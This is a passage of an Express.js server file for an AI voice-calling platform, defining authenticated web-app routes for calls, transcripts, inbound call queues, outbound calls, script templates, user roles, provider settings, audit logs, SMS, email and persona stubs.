        });
      }
      logWebappAuthEvent(
        req,
        "webapp.auth",
        { roles, token_id: tokenId },
        user.id,
      );
      const role = roles.includes("admin")
        ? "admin"
        : roles.includes("operator")
          ? "operator"
          : "unknown";
      const expiresIn = WEBAPP_JWT_TTL_S;
      return res.json({
        ok: true,
        accessToken: token,
        token,
        expiresIn,
        expires_at: new Date((now + WEBAPP_JWT_TTL_S) * 1000).toISOString(),
        user: {
          id: user.id,
          username: user.username || null,
          first_name: user.first_name || null,
          last_name: user.last_name || null,
          role,
        },
        roles,
        role,
        environment: WEBAPP_ENVIRONMENT,
        tenant_id: WEBAPP_TENANT_ID,
      });
    } catch (error) {
      console.error("Webapp auth error:", error);
      return res.status(500).json({
        ok: false,
        error: "auth_failed",
        message: "Authentication failed. Please try again.",
      });
    }
  },
);

app.get("/webapp/me", requireWebappJwt, async (req, res) => {
  const session = req.webappSession;
  const roles = session?.roles || [];
  const role = roles.includes("admin")
    ? "admin"
    : roles.includes("operator")
      ? "operator"
      : "unknown";
  return res.json({
    ok: true,
    user: session?.user ? { ...session.user, role } : null,
    roles,
    role,
    environment: WEBAPP_ENVIRONMENT,
    tenant_id: WEBAPP_TENANT_ID,
  });
});

app.post("/webapp/telemetry", requireWebappJwt, async (req, res) => {
  try {
    const payload = req.body || {};
    const events = Array.isArray(payload.events)
      ? payload.events.slice(0, 50)
      : [];
    const cleanedEvents = events.map((event) => ({
      name: String(event?.name || "unknown"),
      ts: String(event?.ts || new Date().toISOString()),
      data: sanitizeTelemetryData(event?.data || {}),
    }));
    const entry = {
      type: "webapp.telemetry",
      request_id: req.requestId || null,
      user_id: String(req.webappSession?.user?.id || ""),
      session_id: String(payload.session_id || "unknown"),
      route: String((payload.context && payload.context.route) || ""),
      environment: WEBAPP_ENVIRONMENT,
      tenant_id: WEBAPP_TENANT_ID,
      events: cleanedEvents,
    };
    console.log(JSON.stringify(entry));
    return res.json({ ok: true });
  } catch (error) {
    console.error("Webapp telemetry error:", error);
    return res.status(500).json({ ok: false, error: "telemetry_failed" });
  }
});

app.get("/webapp/ping", async (req, res) => {
  try {
    return res.json({
      ok: true,
      ts: new Date().toISOString(),
      version: appVersion,
    });
  } catch (error) {
    console.error("Webapp ping error:", error);
    return res.status(500).json({ ok: false, error: "ping_failed" });
  }
});

app.get("/webapp/health", requireWebappJwt, async (req, res) => {
  try {
    const readiness = getProviderReadiness();
    const health = getProviderHealthEntry(currentProvider);
    return res.json({
      ok: true,
      server_time: new Date().toISOString(),
      environment: WEBAPP_ENVIRONMENT,
      tenant_id: WEBAPP_TENANT_ID,
      provider: {
        current: currentProvider,
        readiness,
        degraded: isProviderDegraded(currentProvider),
        last_error_at: health?.lastErrorAt || null,
        last_success_at: health?.lastSuccessAt || null,
      },
      webhook: {
        last_sequence: miniappSequence,
      },
    });
  } catch (error) {
    console.error("Webapp health error:", error);
    return res.status(500).json({ ok: false, error: "health_failed" });
  }
});

app.get(
  "/webapp/callbacks",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      if (!db) return res.json({ ok: true, tasks: [] });
      const limit = Math.min(50, Math.max(1, Number(req.query?.limit || 10)));
      const jobs = await db.listCallJobs({
        job_type: "callback_call",
        status: "pending",
        limit,
      });
      const tasks = (jobs || []).map((job) => {
        let payload = {};
        try {
          payload = job.payload ? JSON.parse(job.payload) : {};
        } catch {
          payload = {};
        }
        return {
          id: job.id,
          run_at: job.run_at,
          number: payload.number || payload.phone_number || "Unknown",
        };
      });
      return res.json({ ok: true, tasks });
    } catch (error) {
      console.error("Webapp callbacks error:", error);
      return res.status(500).json({ ok: false, error: "callbacks_failed" });
    }
  },
);

app.get("/webapp/calls", requireWebappJwt, async (req, res) => {
  try {
    const limit = Math.min(100, Math.max(1, Number(req.query?.limit || 25)));
    const cursor = Math.max(0, Number(req.query?.cursor || 0));
    const status = req.query?.status || null;
    const query = req.query?.q || req.query?.query || null;
    const calls = await db.getRecentCalls({
      limit,
      offset: cursor,
      status,
      query,
    });
    const normalized = calls.map(normalizeCallRecordForApi);
    return res.json({
      ok: true,
      calls: normalized,
      next_cursor: normalized.length === limit ? cursor + limit : null,
    });
  } catch (error) {
    console.error("Webapp calls error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_calls" });
  }
});

app.get("/webapp/calls/:callSid", requireWebappJwt, async (req, res) => {
  try {
    const call = await db.getCall(req.params.callSid);
    if (!call) {
      return res.status(404).json({ ok: false, error: "call_not_found" });
    }
    const gate = webhookService.getInboundGate(req.params.callSid);
    const liveSnapshot =
      webhookService.getLiveConsoleSnapshot?.(req.params.callSid) || null;
    return res.json({
      ok: true,
      call: normalizeCallRecordForApi(call),
      inbound_gate: gate
        ? {
            status: gate.status,
            decision_by: gate.chatId || null,
            decision_at: gate.updatedAt || null,
          }
        : null,
      live: liveSnapshot,
    });
  } catch (error) {
    console.error("Webapp call detail error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_call" });
  }
});

app.get(
  "/webapp/calls/:callSid/transcripts",
  requireWebappJwt,
  async (req, res) => {
    try {
      if (!db) {
        return res.json({ ok: true, transcripts: [] });
      }
      const transcripts = await db.getCallTranscripts(req.params.callSid);
      return res.json({ ok: true, transcripts: transcripts || [] });
    } catch (error) {
      console.error("Webapp transcripts error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_fetch_transcripts" });
    }
  },
);

app.get("/webapp/calls/:callSid/events", requireWebappJwt, async (req, res) => {
  try {
    const after = Number(req.query?.after || 0);
    const limit = Math.min(200, Math.max(1, Number(req.query?.limit || 100)));
    const events = await db.getCallStatesAfter(
      req.params.callSid,
      after,
      limit,
    );
    const latest = events.length
      ? events[events.length - 1].sequence_number
      : after;
    return res.json({
      ok: true,
      events,
      latest_sequence: latest,
    });
  } catch (error) {
    console.error("Webapp call events error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_events" });
  }
});

app.post(
  "/webapp/calls/:callSid/script",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const scriptId = Number(req.body?.script_id || req.body?.scriptId);
      if (!Number.isFinite(scriptId)) {
        return res.status(400).json({ ok: false, error: "invalid_script_id" });
      }
      const result = await applyScriptInjection(
        req.params.callSid,
        scriptId,
        req.webappSession?.user?.id,
      );
      if (!result.ok) {
        return res.status(400).json({ ok: false, error: result.error });
      }
      return res.json({ ok: true, script: result.script });
    } catch (error) {
      console.error("Webapp script inject error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_inject_script" });
    }
  },
);

app.post(
  "/webapp/calls/:callSid/stream/retry",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      const host = req.headers.host || config.server?.hostname;
      if (!host) {
        return res.status(400).json({ ok: false, error: "missing_host" });
      }
      const scheduled = await scheduleStreamReconnect(callSid, host, "manual");
      if (!scheduled) {
        return res.status(400).json({ ok: false, error: "retry_unavailable" });
      }
      await db
        ?.updateCallState?.(callSid, "stream_retry_manual", {
          at: new Date().toISOString(),
          user_id: req.webappSession?.user?.id || null,
        })
        .catch(() => {});
      return res.json({ ok: true });
    } catch (error) {
      console.error("Webapp stream retry error:", error);
      return res.status(500).json({ ok: false, error: "retry_failed" });
    }
  },
);

app.post(
  "/webapp/calls/:callSid/stream/fallback",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      const callConfig = callConfigurations.get(callSid);
      const session = activeCalls.get(callSid);
      const ok = await activateDtmfFallback(
        callSid,
        callConfig,
        session?.gptService,
        session?.interactionCount || 0,
        "manual_fallback",
      );
      if (!ok) {
        return res
          .status(400)
          .json({ ok: false, error: "fallback_unavailable" });
      }
      return res.json({ ok: true });
    } catch (error) {
      console.error("Webapp stream fallback error:", error);
      return res.status(500).json({ ok: false, error: "fallback_failed" });
    }
  },
);

app.post(
  "/webapp/calls/:callSid/end",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      await endCallForProvider(callSid);
      await db
        ?.updateCallState?.(callSid, "admin_end_call", {
          at: new Date().toISOString(),
          user_id: req.webappSession?.user?.id || null,
        })
        .catch(() => {});
      return res.json({ ok: true });
    } catch (error) {
      console.error("Webapp end call error:", error);
      return res.status(500).json({ ok: false, error: "end_failed" });
    }
  },
);

app.get("/webapp/inbound/queue", requireWebappJwt, async (req, res) => {
  try {
    const liveCalls = getMiniappLiveSnapshot();
    const inbound = liveCalls.filter((call) => call?.inbound);
    const queue = (
      await Promise.all(
        inbound.map(async (call) => {
          const gate = webhookService.getInboundGate(call.call_sid);
          const decision =
            gate?.status === "expired" ? "missed" : gate?.status || "pending";
          const number = call.from || call.phone_number || null;
          let recentCalls = null;
          if (db && number) {
            try {
              recentCalls = await db.getRecentCallCountByNumber(number, 72);
            } catch {
              recentCalls = null;
            }
          }
          const lowerLabel = String(
            call.route_label || call.script || "",
          ).toLowerCase();
          let priority = "normal";
          if (!number) priority = "unknown";
          if (lowerLabel.includes("vip") || lowerLabel.includes("priority"))
            priority = "vip";
          if (typeof recentCalls === "number" && recentCalls >= 3)
            priority = "repeat";
          let risk = "normal";
          if (typeof recentCalls === "number" && recentCalls >= 5)
            risk = "high";
          return {
            ...call,
            decision,
            decision_by: gate?.chatId || null,
            decision_at: gate?.updatedAt || null,
            priority,
            rule_summary: {
              decision: decision === "pending" ? "allow" : decision,
              label: call.route_label || call.script || "default",
              risk,
              recent_calls: recentCalls,
            },
          };
        }),
      )
    ).filter((call) => {
      const status = String(call.status || "").toLowerCase();
      const decision = String(call.decision || "pending").toLowerCase();
      if (decision !== "pending") return false;
      return (
        ["ringing", "queued", "initiated", "in-progress"].includes(status) ||
        !status
      );
    });
    const notice = queue.length
      ? {
          level: "info",
          message:
            "Incoming call pending. Answer in the live console to start the call.",
          pending_count: queue.length,
        }
      : null;
    return res.json({ ok: true, calls: queue, notice });
  } catch (error) {
    console.error("Webapp inbound queue error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_queue" });
  }
});

app.post(
  "/webapp/inbound/:callSid/callback",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      const windowMinutes = Math.max(
        5,
        Math.min(120, Number(req.body?.window_minutes || 30)),
      );
      const live = getMiniappLiveSnapshot().find(
        (call) => call.call_sid === callSid,
      );
      const callRecord = live || (db ? await db.getCall(callSid) : null);
      const number =
        callRecord?.from || callRecord?.phone_number || callRecord?.to || null;
      const prompt = config.inbound?.defaultPrompt;
      const firstMessage = config.inbound?.defaultFirstMessage;
      if (!number || !prompt || !firstMessage) {
        return res.status(400).json({
          ok: false,
          error: "missing_callback_payload",
          message: "Missing number or default prompt/first message.",
        });
      }
      const runAt = new Date(
        Date.now() + windowMinutes * 60 * 1000,
      ).toISOString();
      const payload = {
        number,
        prompt,
        first_message: firstMessage,
        route_label: callRecord?.route_label || null,
        script: callRecord?.script || null,
        callback_window_min: windowMinutes,
        requested_by: String(req.webappSession?.user?.id || ""),
      };
      await scheduleCallJob("callback_call", payload, runAt);
      return res.json({ ok: true, run_at: runAt });
    } catch (error) {
      console.error("Webapp callback schedule error:", error);
      return res.status(500).json({ ok: false, error: "callback_failed" });
    }
  },
);

app.post(
  "/webapp/inbound/:callSid/answer",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      const result = await handleInboundAdminDecision(
        callSid,
        "answer",
        req.webappSession?.user?.id,
      );
      if (!result.ok) {
        return res.status(result.error === "already_handled" ? 409 : 400).json({
          ok: false,
          error: result.error,
          status: result.status || null,
        });
      }
      return res.json({ ok: true, status: result.status });
    } catch (error) {
      console.error("Webapp answer error:", error);
      return res.status(500).json({ ok: false, error: "answer_failed" });
    }
  },
);

app.post(
  "/webapp/inbound/:callSid/decline",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { callSid } = req.params;
      const result = await handleInboundAdminDecision(
        callSid,
        "decline",
        req.webappSession?.user?.id,
      );
      if (!result.ok) {
        return res.status(result.error === "already_handled" ? 409 : 400).json({
          ok: false,
          error: result.error,
          status: result.status || null,
        });
      }
      return res.json({ ok: true, status: result.status });
    } catch (error) {
      console.error("Webapp decline error:", error);
      return res.status(500).json({ ok: false, error: "decline_failed" });
    }
  },
);

app.post(
  "/webapp/outbound-call",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const payload = req.body || {};
      const number = String(payload.number || "").trim();
      const prompt = String(payload.prompt || "").trim();
      const firstMessage = String(
        payload.first_message || payload.firstMessage || "",
      ).trim();
      if (!number || !prompt || !firstMessage) {
        return res.status(400).json({
          ok: false,
          error: "missing_fields",
          message: "Missing required fields: number, prompt, first_message.",
        });
      }
      if (!number.match(/^\+[1-9]\d{1,14}$/)) {
        return res.status(400).json({
          ok: false,
          error: "invalid_number",
          message: "Invalid phone number format. Use E.164 format.",
        });
      }

      const scriptIdRaw = payload.script_id ?? payload.scriptId;
      const scriptId = Number.isFinite(Number(scriptIdRaw))
        ? Number(scriptIdRaw)
        : null;

      const callPayload = {
        number,
        prompt,
        first_message: firstMessage,
        user_chat_id: null,
        customer_name: payload.customer_name || null,
        business_id: payload.business_id || null,
        script: payload.script || null,
        script_id: scriptId,
        purpose: payload.purpose || null,
        emotion: payload.emotion || null,
        urgency: payload.urgency || null,
        technical_level: payload.technical_level || null,
        voice_model: payload.voice_model || null,
        collection_profile: payload.collection_profile || null,
        collection_expected_length: payload.collection_expected_length || null,
        collection_timeout_s: payload.collection_timeout_s || null,
        collection_max_retries: payload.collection_max_retries || null,
        collection_mask_for_gpt: payload.collection_mask_for_gpt,
        collection_speak_confirmation: payload.collection_speak_confirmation,
      };

      const host = resolveHost(req) || config.server?.hostname;
      const result = await placeOutboundCall(callPayload, host);

      await db
        ?.logMiniappAudit?.({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.outbound_call",
          call_sid: result.callId,
          metadata: {
            to: maskPhoneForLog(number),
            script_id: scriptId,
            script: payload.script || null,
            prompt: truncatePrompt(prompt, 120),
          },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});

      return res.json({
        ok: true,
        call_sid: result.callId,
        to: number,
        status: result.callStatus,
        provider: currentProvider,
      });
    } catch (error) {
      console.error("Webapp outbound call error:", error);
      return res.status(500).json({
        ok: false,
        error: "outbound_failed",
        message: "Failed to create outbound call.",
      });
    }
  },
);

app.get("/webapp/scripts", requireWebappJwt, async (req, res) => {
  try {
    const scripts = await db.getCallTemplates();
    return res.json({ ok: true, scripts });
  } catch (error) {
    console.error("Webapp scripts list error:", error);
    return res
      .status(500)
      .json({ ok: false, error: "failed_to_fetch_scripts" });
  }
});

app.post(
  "/webapp/scripts",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const payload = req.body || {};
      if (!payload?.name) {
        return res.status(400).json({ ok: false, error: "missing_name" });
      }
      const id = await db.createCallTemplate(payload);
      const script = await db.getCallTemplateById(id);
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.script.create",
          metadata: { id, name: payload.name },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      return res.json({ ok: true, script });
    } catch (error) {
      console.error("Webapp script create error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_create_script" });
    }
  },
);

app.put(
  "/webapp/scripts/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const id = Number(req.params.id);
      if (!Number.isFinite(id)) {
        return res.status(400).json({ ok: false, error: "invalid_id" });
      }
      const changes = await db.updateCallTemplate(id, req.body || {});
      if (!changes) {
        return res.status(404).json({ ok: false, error: "script_not_found" });
      }
      const script = await db.getCallTemplateById(id);
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.script.update",
          metadata: { id },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      return res.json({ ok: true, script });
    } catch (error) {
      console.error("Webapp script update error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_update_script" });
    }
  },
);

app.delete(
  "/webapp/scripts/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const id = Number(req.params.id);
      if (!Number.isFinite(id)) {
        return res.status(400).json({ ok: false, error: "invalid_id" });
      }
      const changes = await db.deleteCallTemplate(id);
      if (!changes) {
        return res.status(404).json({ ok: false, error: "script_not_found" });
      }
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.script.delete",
          metadata: { id },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      return res.json({ ok: true });
    } catch (error) {
      console.error("Webapp script delete error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_delete_script" });
    }
  },
);

app.get(
  "/webapp/users",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const access = await getMiniappAccessLists();
      return res.json({
        ok: true,
        admins: access.admins,
        viewers: access.viewers,
      });
    } catch (error) {
      console.error("Webapp users error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_fetch_users" });
    }
  },
);

app.post(
  "/webapp/users",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const userId = String(req.body?.user_id || req.body?.id || "").replace(
        /[^\d]/g,
        "",
      );
      if (!userId) {
        return res.status(400).json({ ok: false, error: "missing_user_id" });
      }
      const role = String(req.body?.role || "viewer").toLowerCase();
      const access = await getMiniappAccessLists();
      const admins = new Set(access.admins.map(String));
      const viewers = new Set(access.viewers.map(String));
      if (role === "admin") {
        admins.add(userId);
      } else {
        viewers.add(userId);
      }
      await db.setSetting(
        MINIAPP_ACCESS_ADMIN_KEY,
        JSON.stringify(Array.from(admins)),
      );
      await db.setSetting(
        MINIAPP_ACCESS_VIEWER_KEY,
        JSON.stringify(Array.from(viewers)),
      );
      await loadMiniappAccessCache(true);
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.user.add",
          metadata: { user_id: userId, role },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      const updated = await getMiniappAccessLists();
      return res.json({
        ok: true,
        admins: updated.admins,
        viewers: updated.viewers,
      });
    } catch (error) {
      console.error("Webapp user add error:", error);
      return res.status(500).json({ ok: false, error: "failed_to_add_user" });
    }
  },
);

app.post(
  "/webapp/users/:id/promote",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const userId = String(req.params.id || "").replace(/[^\d]/g, "");
      if (!userId) {
        return res.status(400).json({ ok: false, error: "missing_user_id" });
      }
      const access = await getMiniappAccessLists();
      const admins = new Set(access.admins.map(String));
      const viewers = new Set(access.viewers.map(String));
      admins.add(userId);
      await db.setSetting(
        MINIAPP_ACCESS_ADMIN_KEY,
        JSON.stringify(Array.from(admins)),
      );
      await db.setSetting(
        MINIAPP_ACCESS_VIEWER_KEY,
        JSON.stringify(Array.from(viewers)),
      );
      await loadMiniappAccessCache(true);
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.user.promote",
          metadata: { user_id: userId },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      const updated = await getMiniappAccessLists();
      return res.json({
        ok: true,
        admins: updated.admins,
        viewers: updated.viewers,
      });
    } catch (error) {
      console.error("Webapp user promote error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_promote_user" });
    }
  },
);

app.delete(
  "/webapp/users/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const userId = String(req.params.id || "").replace(/[^\d]/g, "");
      if (!userId) {
        return res.status(400).json({ ok: false, error: "missing_user_id" });
      }
      const access = await getMiniappAccessLists();
      const currentAdmin = String(req.webappSession?.user?.id || "");
      const admins = access.admins.filter((id) => String(id) !== userId);
      const viewers = access.viewers.filter((id) => String(id) !== userId);
      if (
        currentAdmin &&
        String(currentAdmin) === userId &&
        !access.envAdmins.includes(userId)
      ) {
        admins.push(userId);
      }
      await db.setSetting(MINIAPP_ACCESS_ADMIN_KEY, JSON.stringify(admins));
      await db.setSetting(MINIAPP_ACCESS_VIEWER_KEY, JSON.stringify(viewers));
      await loadMiniappAccessCache(true);
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.user.remove",
          metadata: { user_id: userId },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      const updated = await getMiniappAccessLists();
      return res.json({
        ok: true,
        admins: updated.admins,
        viewers: updated.viewers,
      });
    } catch (error) {
      console.error("Webapp user remove error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_remove_user" });
    }
  },
);

app.get(
  "/webapp/settings",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const readiness = getProviderReadiness();
      return res.json({
        ok: true,
        provider: {
          current: currentProvider,
          stored: storedProvider,
          supported: SUPPORTED_PROVIDERS,
          readiness,
        },
        webhook_health: {
          last_sequence: miniappSequence,
        },
        retention: config.dataRetention || null,
      });
    } catch (error) {
      console.error("Webapp settings error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_fetch_settings" });
    }
  },
);

app.post(
  "/webapp/settings/provider",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    const idempotency = applyIdempotency(req, res);
    if (idempotency.handled) return;
    try {
      const { provider } = req.body || {};
      if (!provider || !SUPPORTED_PROVIDERS.includes(provider)) {
        return res
          .status(400)
          .json({ ok: false, error: "unsupported_provider" });
      }
      const readiness = getProviderReadiness();
      if (!readiness[provider]) {
        return res
          .status(400)
          .json({ ok: false, error: "provider_not_configured" });
      }
      const normalized = provider.toLowerCase();
      const changed = normalized !== currentProvider;
      currentProvider = normalized;
      storedProvider = normalized;
      await db
        .logMiniappAudit({
          user_id: String(req.webappSession?.user?.id || ""),
          action: "webapp.provider.switch",
          metadata: { provider: normalized, changed },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      return res.json({ ok: true, provider: currentProvider, changed });
    } catch (error) {
      console.error("Webapp provider switch error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "provider_switch_failed" });
    }
  },
);

app.get(
  "/webapp/audit",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const limit = Number(req.query?.limit || 50);
      const cursor = Number(req.query?.cursor || 0);
      const response = await db.getMiniappAuditLogs({ limit, cursor });
      const logs = (response.logs || []).map((row) => {
        let metadata = null;
        if (row?.metadata) {
          try {
            metadata = JSON.parse(row.metadata);
          } catch (_) {
            metadata = row.metadata;
          }
        }
        return { ...row, metadata };
      });
      return res.json({
        ok: true,
        logs,
        next_cursor: response.next_cursor ?? null,
      });
    } catch (error) {
      console.error("Webapp audit error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_fetch_audit" });
    }
  },
);

// SMS Management Endpoints
app.get("/webapp/sms", requireWebappJwt, async (req, res) => {
  try {
    const limit = Number(req.query?.limit || 20);
    const status = req.query?.status;
    const params = [limit];
    let query = "SELECT * FROM sms_messages WHERE 1=1";

    if (status) {
      query += " AND status = ?";
      params.unshift(status);
    }

    query += " ORDER BY created_at DESC LIMIT ?";

    const messages = await new Promise((resolve, reject) => {
      if (!db.db) return resolve([]);
      db.db.all(query, params, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });

    return res.json({ ok: true, messages });
  } catch (error) {
    console.error("Webapp SMS fetch error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_sms" });
  }
});

app.post("/webapp/sms/send", requireWebappJwt, async (req, res) => {
  try {
    if (!smsService) {
      return res
        .status(500)
        .json({ ok: false, error: "sms_service_not_available" });
    }

    const { phone_number, body, scheduled_for } = req.body;
    if (!phone_number || !body) {
      return res
        .status(400)
        .json({ ok: false, error: "missing_required_fields" });
    }

    const result = await smsService.sendSMS(phone_number, body, undefined, {
      idempotencyKey: req.headers["idempotency-key"],
    });

    return res.json({
      ok: true,
      message_id: result.message_sid,
      status: result.status,
    });
  } catch (error) {
    console.error("Webapp SMS send error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_send_sms" });
  }
});

app.get("/webapp/sms/templates", requireWebappJwt, async (req, res) => {
  try {
    const templates = [
      { id: 1, name: "Welcome", body: "Welcome to our service!" },
      {
        id: 2,
        name: "Reminder",
        body: "This is a reminder about your appointment.",
      },
      {
        id: 3,
        name: "Verification",
        body: "Your verification code is: {code}",
      },
    ];
    return res.json({ ok: true, templates });
  } catch (error) {
    return res
      .status(500)
      .json({ ok: false, error: "failed_to_fetch_templates" });
  }
});

app.post(
  "/webapp/sms/:messageId/retry",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { messageId } = req.params;
      if (!smsService || !db.db) {
        return res
          .status(500)
          .json({ ok: false, error: "service_not_available" });
      }

      // Retry logic would be implemented here
      return res.json({ ok: true, retry_queued: true });
    } catch (error) {
      console.error("Webapp SMS retry error:", error);
      return res.status(500).json({ ok: false, error: "failed_to_retry_sms" });
    }
  },
);

// Email Management Endpoints
app.get("/webapp/emails", requireWebappJwt, async (req, res) => {
  try {
    const limit = Number(req.query?.limit || 20);
    const status = req.query?.status;
    const params = [limit];
    let query = "SELECT * FROM email_messages WHERE 1=1";

    if (status) {
      query += " AND status = ?";
      params.unshift(status);
    }

    query += " ORDER BY created_at DESC LIMIT ?";

    const messages = await new Promise((resolve, reject) => {
      if (!db.db) return resolve([]);
      db.db.all(query, params, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });

    return res.json({ ok: true, messages });
  } catch (error) {
    console.error("Webapp email fetch error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_fetch_emails" });
  }
});

app.post("/webapp/emails/send", requireWebappJwt, async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ ok: false, error: "email_service_not_available" });
    }

    const { to, subject, body } = req.body;
    if (!to || !subject || !body) {
      return res
        .status(400)
        .json({ ok: false, error: "missing_required_fields" });
    }

    const result = await emailService.enqueueEmail(
      {
        to,
        subject,
        html: body,
        text: body,
      },
      { idempotencyKey: req.headers["idempotency-key"] },
    );

    return res.json({ ok: true, message_id: result.message_id });
  } catch (error) {
    console.error("Webapp email send error:", error);
    return res.status(500).json({ ok: false, error: "failed_to_send_email" });
  }
});

app.get("/webapp/emails/templates", requireWebappJwt, async (req, res) => {
  try {
    const templates = [
      {
        id: 1,
        name: "Welcome Email",
        subject: "Welcome!",
        body: "<p>Welcome to our service!</p>",
      },
      {
        id: 2,
        name: "Confirmation",
        subject: "Confirmation",
        body: "<p>Your action has been confirmed.</p>",
      },
    ];
    return res.json({ ok: true, templates });
  } catch (error) {
    return res
      .status(500)
      .json({ ok: false, error: "failed_to_fetch_templates" });
  }
});

// Personas Management Endpoints
app.get("/webapp/personas", requireWebappJwt, async (req, res) => {
  try {
    const personas = [
      {
        id: 1,
        name: "Professional",
        description: "Formal and professional tone",
        system_prompt: "You are a professional AI assistant.",
      },
      {
        id: 2,
        name: "Friendly",
        description: "Warm and friendly tone",
        system_prompt: "You are a friendly AI assistant.",
      },
    ];
    return res.json({ ok: true, personas });
  } catch (error) {
    return res
      .status(500)
      .json({ ok: false, error: "failed_to_fetch_personas" });
  }
});

app.post(
  "/webapp/personas",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { name, description, system_prompt, voice_model } = req.body;
      if (!name) {
        return res
          .status(400)
          .json({ ok: false, error: "missing_required_fields" });
      }

      // In a real implementation, this would save to database
      const persona = {
        id: Math.floor(Math.random() * 10000),
        name,
        description,
        system_prompt,
        voice_model,
        created_at: new Date().toISOString(),
      };

      return res.json({ ok: true, persona });
    } catch (error) {
      console.error("Webapp persona create error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_create_persona" });
    }
  },
);

app.put(
  "/webapp/personas/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { id } = req.params;
      const { name, description, system_prompt, voice_model } = req.body;

      const persona = {
        id: parseInt(id),
        name,
        description,
        system_prompt,
        voice_model,
        updated_at: new Date().toISOString(),
      };

      return res.json({ ok: true, persona });
    } catch (error) {
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_update_persona" });
    }
  },
);

app.delete(
  "/webapp/personas/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { id } = req.params;
      return res.json({ ok: true, deleted_id: parseInt(id) });
    } catch (error) {
      return res
